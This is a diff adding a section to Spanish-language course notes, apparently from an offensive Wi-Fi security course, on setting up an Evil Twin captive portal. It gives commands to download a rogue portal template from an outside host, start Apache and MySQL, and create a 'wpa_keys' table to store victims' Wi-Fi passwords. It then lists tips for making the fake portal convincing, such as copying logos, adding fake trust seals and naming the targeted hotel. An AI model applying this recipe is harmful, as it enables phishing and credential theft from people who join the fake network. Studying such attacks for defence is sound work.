@@ -1476,3 +1476,50 @@ subnet 192.168.1.128 netmask 255.255.255.128 {
 - Configurar los mismos servidores DNS que la red original (si se conocen)
 - Establecer tiempos de concesión cortos para mantener control sobre los clientes
 - Incluir todas las opciones DHCP que los clientes puedan esperar (como servidores de tiempo)
+
+
+## 45 y 46 . EvilTwin - Descarga y uso de plantilla. Creación de base de datos en MYSQL
+Este video explica cómo implementar y personalizar plantillas para el portal cautivo que se mostrará a las víctimas cuando se conecten al punto de acceso Evil Twin, con el objetivo de capturar credenciales.
+
+### Fundamento técnico:
+- Las plantillas son páginas web que simulan portales de autenticación legítimos
+- Se utilizan para engañar a los usuarios y que introduzcan sus credenciales
+- Incluyen código para capturar y enviar las credenciales al atacante
+
+### Procedimiento:
+```bash
+# Navegar al directorio web
+cd /var/www/html
+
+# Descargar y preparar la plantilla
+wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip
+unzip Rogue_AP.zip
+rm -r __MACOSX/
+rm -r Rogue_AP.zip
+mv Rougue_AP/* .  # mover todo el contenido del directorio fuera de éste
+rm -r Rogue_AP
+service apache2 start && service mysql start 
+# si entramos en localhost podemos ver la plantilla
+
+# Configurar la base de datos
+mysql -uroot
+create database rogue_AP;
+show databases;
+use rogue_AP;
+create table wpa_keys(password1 varchar(32), password2 varchar(32));
+show tables;
+describe wpa_keys;
+select * from wpa_keys;  # ver las contraseñas almacenadas
+
+# Crear el usuario y darle permisos
+create user fakeap@localhost identified by 'fakeap';
+show databases;
+grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
+```
+
+### Consideraciones de diseño para mayor efectividad:
+- Replicar exactamente los colores, fuentes y logotipos de los portales originales
+- Incluir elementos de confianza como certificados de seguridad falsos o sellos de confianza
+- Adaptar el contenido al contexto (por ejemplo, mencionar el nombre del hotel si se está atacando una red de hotel)
+- Implementar validación de formularios para simular comportamiento real
+- Incluir mensajes de error realistas para credenciales incorrectas
